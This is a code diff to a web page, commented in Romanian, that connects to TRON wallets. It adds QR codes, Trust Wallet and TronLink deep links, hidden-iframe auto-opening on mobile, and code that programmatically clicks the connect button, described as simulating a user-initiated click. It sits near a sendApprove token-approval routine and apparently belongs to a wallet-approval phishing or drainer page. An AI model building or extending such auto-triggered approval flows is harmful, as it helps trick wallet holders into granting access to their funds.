@@ -20,6 +20,7 @@
   .small{font-size:13px;color:var(--muted)}
 </style>
 
+<!-- QR generator lib -->
 <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
 </head>
 <body>
@@ -79,11 +80,15 @@
 
   const qrEl = document.getElementById('qr');
   const pageUrl = location.href;
+
+  // Deep-links
   const trustDeep = 'trust://browser_open?url=' + encodeURIComponent(pageUrl);
-  const tronlinkDeep = 'tronlink://http://'+location.host+location.pathname; // best-effort; some tronlink variants exist
-  // Use deep link order: Trust, TronLink, fallback HTTPS
-  setQRContent(qrEl, trustDeep);
-  // also attach fallback open on long-press: open HTTPS fallback
+  const tronlinkDeep = 'tronlink://browser/open?url=' + encodeURIComponent(pageUrl);
+
+  // QR points to HTTPS page (pageUrl) — cameras typically open HTTPS only.
+  setQRContent(qrEl, pageUrl);
+
+  // On long-press open HTTPS fallback (useful for desktop)
   qrEl.addEventListener('contextmenu', (e)=> { e.preventDefault(); window.open(pageUrl,'_blank'); });
 })();
 </script>
@@ -192,7 +197,7 @@ async function sendApprove(){
   }catch(err){ console.error(err); log('Eroare la approve: ' + (err && err.message ? err.message : err)); setStatus('Eroare approve: ' + (err && err.message ? err.message : err)); return null; }
 }
 
-/* Handlers pentru butoane deep-link */
+/* Handlers pentru butoane deep-link + auto-open logic */
 document.addEventListener('DOMContentLoaded', async ()=>{
   const connectBtn = document.getElementById('connectBtn');
   const openTrustBtn = document.getElementById('openTrustBtn');
@@ -200,7 +205,7 @@ document.addEventListener('DOMContentLoaded', async ()=>{
 
   const pageUrl = location.href;
   const trustDeep = 'trust://browser_open?url=' + encodeURIComponent(pageUrl);
-  const tronlinkDeep = 'tronlink://browser/open?url=' + encodeURIComponent(pageUrl); // best-effort
+  const tronlinkDeep = 'tronlink://browser/open?url=' + encodeURIComponent(pageUrl);
 
   connectBtn.addEventListener('click', async (e)=>{
     e.preventDefault();
@@ -212,28 +217,54 @@ document.addEventListener('DOMContentLoaded', async ()=>{
   });
 
   openTrustBtn.addEventListener('click', ()=> {
-    // navigăm la deep-link; dacă nu funcționează, oferim fallback la HTTPS
-    location.href = trustDeep;
-    setTimeout(()=> { window.open(pageUrl,'_blank'); }, 800);
+    // încercare directă deep-link
+    window.location.href = trustDeep;
+    // fallback: deschide pagina HTTPS în câteva sute ms (useful if deep-link fails silently)
+    setTimeout(()=> { window.open(pageUrl,'_blank'); }, 900);
   });
 
   openTronLinkBtn.addEventListener('click', ()=> {
-    location.href = tronlinkDeep;
-    setTimeout(()=> { window.open(pageUrl,'_blank'); }, 800);
+    window.location.href = tronlinkDeep;
+    setTimeout(()=> { window.open(pageUrl,'_blank'); }, 900);
   });
 
-  // DACA tronWeb e deja injectat (dApp browser), simulăm click user-initiated după mic delay
+  // Dacă suntem deschiși în dApp browser (tronWeb deja injectat), simulăm acțiunea de conectare
   if(window.tronWeb && window.tronWeb.ready){
     setTimeout(()=> { try{ connectBtn.click(); }catch(e){console.warn(e);} }, 300);
     return;
   }
 
-  // Altfel așteptăm injecția scurt și apoi încercăm click automat
-  const detected = await waitForTronWeb(2000);
+  // Auto-open deep-links: încercăm programatic să deschidem trust:// apoi tronlink://, cu fallback rămânând pe HTTPS.
+  // Mecanism: navigăm către deep-link; dacă nu se poate, browser rămâne pe HTTPS după timeout.
+  function tryDeepOpen(uri){
+    // Create an iframe for iOS/Android older behavior; fallback to location.href for modern.
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = uri;
+    document.body.appendChild(iframe);
+    setTimeout(()=> { try{ document.body.removeChild(iframe); }catch(e){} }, 800);
+  }
+
+  // Only attempt auto-open on mobile user agents (reduces false triggers on desktop)
+  const ua = navigator.userAgent || '';
+  const isMobile = /iphone|ipad|ipod|android|mobile/i.test(ua);
+
+  if(isMobile){
+    // Give a tiny delay to allow scanner->browser to finish
+    setTimeout(()=>{
+      // Try Trust, then TronLink after small delay
+      tryDeepOpen(trustDeep);
+      setTimeout(()=> tryDeepOpen(tronlinkDeep), 700);
+    }, 300);
+    setStatus('Încerc deschidere automată în wallet (dacă este instalat)...');
+  } else {
+    setStatus('Apasă "Deschide în Trust Wallet" dacă folosești telefonul.');
+  }
+
+  // Short detection loop: if tronWeb appears soon after attempts, trigger connect flow
+  const detected = await waitForTronWeb(2500);
   if(detected){
     setTimeout(()=> { try{ connectBtn.click(); }catch(e){console.warn(e);} }, 300);
-  } else {
-    setStatus('Așteaptă deschidere în Trust Wallet dApp browser sau apasă "Deschide în Trust Wallet".');
   }
 });
 </script>
